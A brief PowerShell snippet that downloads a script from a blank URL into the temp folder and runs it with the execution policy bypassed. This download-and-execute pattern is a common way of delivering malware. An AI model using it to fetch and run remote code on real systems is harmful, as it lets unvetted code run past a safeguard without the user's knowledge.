# Download from url and write to local file in temp\, similar to curl.

$url = ""
$file = "$env:temp\NAMEOFSCRIPT.ps1"

(New-Object -TypeName System.Net.WebClient).DownloadFile($url, $file)

powershell.exe -ExecutionPolicy ByPass -File $file
